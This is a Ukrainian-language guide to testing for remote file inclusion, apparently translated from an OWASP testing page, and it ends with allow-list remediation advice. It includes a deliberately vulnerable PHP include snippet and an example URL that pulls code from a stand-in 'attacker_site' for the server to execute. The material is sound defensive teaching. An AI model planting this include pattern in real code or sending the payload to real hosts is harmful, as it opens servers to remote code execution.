# Тестування віддаленого включення файлів

## Огляд

Уразливість File Inclusion дозволяє зловмиснику включити файл, зазвичай використовуючи механізми «динамічного включення файлу», реалізовані в цільовій програмі. Уразливість виникає через використання введених користувачем даних без належної перевірки.

Це може призвести до чогось схожого на виведення вмісту файлу, але залежно від серйозності це також може призвести до:

* Виконання коду на веб-сервері
* Виконання коду на стороні клієнта, наприклад JavaScript, що може призвести до інших атак, наприклад міжсайтового сценарію (XSS)
* Відмова в обслуговуванні (DoS)
* Розкриття конфіденційної інформації

Віддалене включення файлів (також відоме як RFI) — це процес включення віддалених файлів за допомогою використання вразливих процедур включення, реалізованих у програмі. Ця вразливість виникає, наприклад, коли сторінка отримує як вхідні дані шлях до файлу, який потрібно включити, і цей вхідний сигнал не очищається належним чином, що дозволяє ввести зовнішню URL-адресу. Хоча більшість прикладів вказують на вразливі сценарії PHP, ми повинні мати на увазі, що це також поширене в інших технологіях, таких як JSP, ASP та інші.

## Як тестувати

Оскільки RFI виникає, коли шляхи, передані операторам «include», не очищаються належним чином, у підході тестування чорної скриньки ми повинні шукати сценарії, які приймають імена файлів як параметри. Розглянемо наступний приклад PHP:

***$incfile = $_REQUEST["файл"];
include($incfile.".php");***

У цьому прикладі шлях витягується із HTTP-запиту, і перевірка вхідних даних не виконується (наприклад, шляхом перевірки вхідних даних за списком дозволених), тому цей фрагмент коду стає вразливим до такого типу атаки. Розглянемо таку URL-адресу:

**http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page**

У цьому випадку віддалений файл буде включено, і будь-який код, який міститься в ньому, буде запущено сервером.

## Рішення

Найефективнішим рішенням для усунення вразливості включення файлів є уникнення передачі даних, наданих користувачем, будь-якій файловій системі/фреймворку API. Якщо це неможливо, програма може підтримувати дозволений список файлів, які можуть бути включені сторінкою, а потім використовувати ідентифікатор (наприклад, номер індексу) для доступу до вибраного файлу. Будь-який запит, що містить недійсний ідентифікатор, має бути відхилений, таким чином зловмисники не мають можливості маніпулювати шляхом атаки.
